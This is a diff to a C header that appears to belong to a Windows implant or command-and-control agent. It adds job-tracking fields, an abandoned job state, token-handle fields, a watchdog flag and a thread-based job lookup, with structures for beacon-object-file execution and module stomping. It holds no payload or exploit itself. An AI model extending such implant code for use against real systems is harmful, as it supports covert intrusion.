@@ -131,6 +131,7 @@ typedef struct {
     D_API( _vsnprintf );
     D_API( DbgPrint );
     D_API( NtQueryVirtualMemory );
+    D_API( NtSetInformationProcess );
 } NAX_NTDLL;
 
 /* ========= [ msvcrt.dll ] ========= */
@@ -447,6 +448,7 @@ typedef struct _NAX_MEMSAVE {
 #define NAX_JOB_RUNNING   1
 #define NAX_JOB_FINISHED  2
 #define NAX_JOB_KILLED    3
+#define NAX_JOB_ABANDONED 4
 
 typedef struct _NAX_INSTANCE NAX_INSTANCE, *PNAX_INSTANCE;
 
@@ -457,12 +459,12 @@ typedef struct _NAX_JOB {
     BYTE                AllocMode;
     BYTE                Abandoned;
     BYTE                StompSlotIdx;
+    DWORD               ThreadId;
     HANDLE              hStopEvent;
     HANDLE              hThread;
     DWORD               TimeoutMs;
     UINT64              StartTick;
     NAX_BOF_CTX         BofCtx;
-    NAX_BOF_CTX         SavedBofCtx;
     RTL_CRITICAL_SECTION Lock;
     PBYTE               CoffCopy;
     UINT32              CoffSize;
@@ -568,8 +570,10 @@ struct _NAX_INSTANCE {
     NAX_DOWNLOAD*     DownloadHead;
     NAX_MEMSAVE*      MemSaveHead;
     NAX_JOB*     JobHead;
-    NAX_JOB*     CurrentJob;
     HANDLE       JobWakeEvent;
+    BYTE         WatchdogDisabled;
+    HANDLE       ActiveToken;
+    HANDLE       OriginalPrimaryToken;
     NAX_TOKEN_NODE* TokenHead;
     NAX_WS2      Ws2;
     NAX_TUNNEL*  TunnelHead;
@@ -595,3 +599,14 @@ struct _NAX_INSTANCE {
     DWORD        ResidentPdataCount;
     BOOL         ResidentPdataInDll;
 };
+
+static inline NAX_JOB* NaxFindCurrentJob( PNAX_INSTANCE Nax ) {
+    DWORD tid = (DWORD)(ULONG_PTR)NaxCurrentTeb()->ClientId.UniqueThread;
+    NAX_JOB* j = Nax->JobHead;
+    while ( j ) {
+        if ( ( j->State == NAX_JOB_RUNNING || j->State == NAX_JOB_ABANDONED ) && j->ThreadId == tid )
+            return j;
+        j = j->Next;
+    }
+    return NULL;
+}
